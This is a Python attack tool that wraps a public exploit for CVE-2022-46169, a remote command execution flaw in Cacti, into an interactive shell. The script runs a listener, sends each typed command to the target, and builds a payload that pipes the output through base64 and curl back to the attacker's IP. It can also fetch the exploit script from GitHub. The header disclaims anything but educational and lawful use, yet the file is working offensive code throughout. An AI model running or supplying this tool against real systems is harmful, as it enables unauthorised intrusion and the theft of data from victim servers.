# MIT License
# 
# Copyright (c) 2023 Anthony Hanel
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# 
# This script is intended for educational purposes and lawful use only. 
# Always obtain proper authorization before performing any kind of penetration 
# testing or security assessment.

import os
import http.server
import socketserver
import argparse
import subprocess
from time import sleep
import urllib.request
import threading
import base64
import readline
import sys


httpd = None  # global reference to the server

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.print_request()

    def do_POST(self):
        self.print_request()

    def print_request(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        print(f"\nReponse from Victim:\n{base64.b64decode(body.decode()).decode()}")

def run_server(port):
    global httpd
    Handler = RequestHandler
    httpd = socketserver.TCPServer(("", port), Handler)
    print("Server listening on port", port)
    httpd.serve_forever()


def run_command(target, ip, port):
    sleep(0.25)
    while True:
        cmd = input("Enter a command to execute: ")
        if cmd.lower() == "exit":
            break
        
        # Create command to be sent
        payload = "{} | base64 | curl -XPOST -d @- {}:{}".format(cmd, ip, port)

        # Construct the final command to execute
        full_cmd = f"python CVE-2022-46169.py {target} -c \"{payload}\""

        # Execute the command
        subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
        

def check_cve_script():
    # Check if CVE-2022-46169.py exists in the directory
    if not os.path.isfile("./CVE-2022-46169.py"):
        print("CVE-2022-46169.py not found in the directory.")
        download = input("Would you like the script to download it for you? (yes/no): ")

        if download.lower() == "yes":
            print("Downloading CVE-2022-46169.py...")
            url = "https://raw.githubusercontent.com/sAsPeCt488/CVE-2022-46169/main/CVE-2022-46169.py"
            urllib.request.urlretrieve(url, "./CVE-2022-46169.py")
            print("Download completed.")
        else:
            print("Please manually download CVE-2022-46169.py and place it in the same directory.")
            exit(1)
    else:
        print("CVE-2022-46169.py found in the directory.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://10.10.11.211)')
    parser.add_argument('--ip', required=True, help='IP address for the server (e.g., 10.10.14.86)')
    parser.add_argument('--port', default=5000, type=int, help='Port number for the server (e.g., 5000)')

    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    check_cve_script()

    print("\nCurrent configuration:")
    print(f"  Target: {args.target}")
    print(f"  Listening Server IP: {args.ip}")
    print(f"  Listening Server Port: {args.port}\n")


    server_thread = threading.Thread(target=run_server, args=(args.port,))
    server_thread.start()

    try:
        # Pass the server thread to the run_command function
        run_command(args.target, args.ip, args.port)
        print("\nTerminating server...")
        httpd.shutdown()  # tell the server to stop
        server_thread.join()  # now we can join the server thread
        print("Server terminated :)")
        exit(1)
    except KeyboardInterrupt:
        print("\nCtrl+C received. Shutting down.")
        httpd.shutdown()  # tell the server to stop
        server_thread.join()
        exit(0)

